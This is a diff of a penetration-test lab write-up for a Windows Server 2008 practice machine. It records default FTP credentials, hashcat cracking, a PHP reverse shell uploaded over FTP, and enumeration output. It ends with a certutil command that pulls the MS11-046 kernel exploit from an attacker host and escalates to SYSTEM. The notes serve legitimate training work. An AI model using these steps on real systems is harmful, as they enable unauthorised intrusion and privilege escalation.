@@ -1,14 +1,14 @@
 **Metadata**
 
 - IP Address:  192.168.148.46
-- Hostname: 
-- OS: 	
+- Hostname: LIVDA
+- OS: Microsoft Windows Serverr 2008 Standard 6.0.6001 Service Pack 1 Build 6001
 - Found Credentials/Users:
 
 Main Objectives:
 
 Local.txt = e184d853a5325c853c5cfcdf7e4bd1f3
-Proof.txt = 
+Proof.txt = 9ccfaf4754615c92ce54ea929b64193d
 
 **Enumeration**
 
@@ -458,6 +458,15 @@ dr-xr-xr-x   1 root     root          512 Aug 02  2024 backup
 - Logged into ftp server using admin/admin
 
 ![[Pasted image 20260217170759.png]]
+- Downloaded and viewed .htaccess file.
+![[Pasted image 20260219103740.png]]
+- Cracked hash using hashcat.
+
+```
+hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
+```
+
+![[Pasted image 20260219104001.png]]
 - Tested that I could upload files
 
 ```
@@ -469,13 +478,14 @@ put text.txt
 - Created reverse shell on revshells.com
 
 ![[Pasted image 20260217171014.png]]
-
 - Uploaded reverse shell via the ftp connection.
 
 ```
 put exploit.php
 ```
+- Logged into website at http://192.168.148.46:242 using offsec/elite.
 
+![[Pasted image 20260219104143.png]]
 - Executed exploit by navigating to site. 
 
 ![[Pasted image 20260217171212.png]]
@@ -508,32 +518,80 @@ set-alias curl Invoke-WebRequest
 
 ```
 
-# CMD
+C:\Users\apache\Documents>whoami
+livda\apache
 
-whoami
-whoami /priv
-whoami /groups
-hostname
-systeminfo
-ver
-echo %USERNAME%
-echo %COMPUTERNAME%
-echo %USERDOMAIN%
-set
-wmic os get Caption,Version,BuildNumber,OSArchitecture
-wmic computersystem get Model,Manufacturer,SystemType
-wmic qfe get HotFixID,InstalledOn
-  
+C:\Users\apache\Documents>whoami /priv
 
-# Powershell
+PRIVILEGES INFORMATION
+----------------------
 
-$env:USERNAME
-$env:COMPUTERNAME
-$env:USERDOMAIN
-Get-ComputerInfo
-Get-WmiObject Win32_OperatingSystem
-Get-WmiObject Win32_ComputerSystem
-Get-HotFix
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+C:\Users\apache\Documents>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Unknown SID type S-1-16-12288 Mandatory group, Enabled by default, Enabled group
+
+C:\Users\apache\Documents>hostname
+LIVDA
+
+C:\Users\apache\Documents>systeminfo
+
+Host Name:                 LIVDA
+OS Name:                   Microsoftr Windows Serverr 2008 Standard 
+OS Version:                6.0.6001 Service Pack 1 Build 6001
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                92573-OEM-7502905-27565
+Original Install Date:     12/19/2009, 11:25:57 AM
+System Boot Time:          2/19/2026, 9:29:15 AM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,670 MB
+Page File: Max Size:       1,985 MB
+Page File: Available:      1,552 MB
+Page File: In Use:         433 MB
+Page File Location(s):     N/A
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           N/A
+
+C:\Users\apache\Documents>ver
+
+Microsoft Windows [Version 6.0.6001]
+
 
 ```
 
@@ -772,15 +830,29 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
+OS Name:                   Microsoftr Windows Serverr 2008 Standard 
+OS Version:                6.0.6001 Service Pack 1 Build 6001
 
+MS11-046
 
+https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/README.md
 ```
 
 **Privilege Escalation**
 
 1. PE Steps
 
+- Downloaded ms11-046 exploit from https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/README.md. 
+
+- Copied exploit to victim server.
+
 ```
+certutil -urlcache -f http://192.168.45.215/ms11-046.exe ms11-046.exe
+```
+
+- Ran exploit and switched user to nt autority\system.
+
+![[Pasted image 20260219153007.png]]
 
 ```
 
